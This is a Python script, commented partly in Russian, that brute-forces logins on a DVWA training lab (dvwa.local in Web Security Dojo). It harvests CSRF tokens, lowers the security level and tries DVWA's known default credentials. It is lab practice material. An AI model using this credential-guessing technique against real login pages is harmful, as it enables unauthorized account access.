#!/usr/bin/python3
import requests
import re

print("DVWA BRUTEFORCE FOR WEB SECURITY DOJO")
print("="*50)

s = requests.Session()

# 1. Получаем CSRF токен с login.php
print("1. Getting CSRF token from login page...")
login_url = "http://dvwa.local/login.php"
r = s.get(login_url)

# Ищем CSRF токен
csrf_match = re.search(r'name="user_token" value="([^"]+)"', r.text)
if csrf_match:
    csrf = csrf_match.group(1)
    print(f"   CSRF token found: {csrf[:15]}...")
else:
    print("   No CSRF token found!")
    csrf = ""

# 2. Логинимся с CSRF
print("\n2. Logging in with CSRF token...")
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login'
}
if csrf:
    login_data['user_token'] = csrf

r = s.post(login_url, data=login_data)

# Проверяем успешность
if 'logout' in r.text.lower() or 'Login' not in r.text:
    print("   ✓ Successfully logged in")
else:
    print("   ✗ Login failed - might need fresh CSRF")
    # Попробуем без CSRF
    print("   Trying without CSRF...")
    s2 = requests.Session()
    r = s2.post(login_url, data={'username':'admin','password':'password','Login':'Login'})
    if 'logout' in r.text.lower():
        print("   ✓ Logged in without CSRF")
        s = s2  # Используем эту сессию
    else:
        print("   ✗ Still failed")

# 3. Ставим security low
print("\n3. Setting security to low...")
security_url = "http://dvwa.local/security.php"

# Получаем страницу security для CSRF
r = s.get(security_url)
csrf_match = re.search(r'name="user_token" value="([^"]+)"', r.text)

security_data = {'security': 'low', 'seclev_submit': 'Submit'}
if csrf_match:
    security_data['user_token'] = csrf_match.group(1)
    print("   With CSRF token")

s.post(security_url, data=security_data)
print("   ✓ Security set to low")

# 4. Проверяем cookies
print(f"\n4. Current cookies: {dict(s.cookies)}")

# 5. Пробуем brute force модуль
print("\n5. Accessing brute force module...")
brute_url = "http://dvwa.local/vulnerabilities/brute/"

# Получаем страницу brute force
r = s.get(brute_url)
print(f"   Response size: {len(r.text)} chars")

# Если получаем страницу логина (1523 chars) - значит не залогинены
if len(r.text) == 1523 or 'login.php' in r.text:
    print("   ✗ Got login page - not authenticated!")
    print("   Trying to extract CSRF from brute force page anyway...")
else:
    print("   ✓ Got brute force page (not login page)")

# Ищем CSRF на странице brute force
csrf_match = re.search(r'name="user_token" value="([^"]+)"', r.text)
if csrf_match:
    brute_csrf = csrf_match.group(1)
    print(f"   Found CSRF on brute page: {brute_csrf[:15]}...")
else:
    print("   No CSRF on brute force page")
    brute_csrf = ""

# 6. BRUTEFORCE АТАКА
print("\n6. STARTING BRUTEFORCE ATTACK")
print("-"*40)

# Известные пароли DVWA в Dojo
credentials = [
    ('admin', 'password'),
    ('gordonb', 'abc123'),
    ('1337', 'charley'),
    ('pablo', 'letmein'),
    ('smithy', 'password')
]

for user, pwd in credentials:
    print(f"\nTesting: {user} / {pwd}")
    
    # Формируем URL
    if brute_csrf:
        url = f"{brute_url}?username={user}&password={pwd}&Login=Login&user_token={brute_csrf}"
        print(f"   URL with CSRF token")
    else:
        url = f"{brute_url}?username={user}&password={pwd}&Login=Login"
        print(f"   URL without CSRF")
    
    # Отправляем запрос
    r = s.get(url)
    
    print(f"   Response: {len(r.text)} chars")
    
    # Анализируем ответ
    if 'Welcome to the password protected area' in r.text:
        print(f"\n" + "!"*50)
        print(f"   ✓ SUCCESS! Credentials found!")
        print(f"   User: {user}")
        print(f"   Password: {pwd}")
        print("!"*50)
        
        # Сохраняем успешный ответ
        with open('success_response.html', 'w') as f:
            f.write(r.text)
        
        # Покажем доказательство
        for line in r.text.split('\n'):
            if 'Welcome' in line:
                clean = re.sub('<[^>]+>', '', line).strip()
                if clean:
                    print(f"   Proof: {clean}")
        
        break  # Выходим после успеха
    
    elif 'Username and/or password incorrect' in r.text:
        print(f"   ✗ Incorrect password")
    
    else:
        print(f"   ? Unknown response")
        # Сохраним для анализа
        with open(f'response_{user}_{pwd}.html', 'w') as f:
            f.write(r.text[:500])

print("\n" + "="*50)
print("ATTACK COMPLETE")
print("="*50)

# 7. Если ничего не сработало
if 'success_response.html' not in locals():
    print("\n7. TROUBLESHOOTING:")
    print("-"*40)
    print("If brute force didn't work, try manually:")
    print("1. Open Firefox in Dojo")
    print("2. Go to: http://dvwa.local/")
    print("3. Login with: admin / password")
    print("4. Set security to LOW")
    print("5. Go to Brute Force module")
    print("6. Try username: admin, password: password")
    print("7. You should see: 'Welcome to the password protected area'")
    print("\nIf manual works but script doesn't, check cookies.")
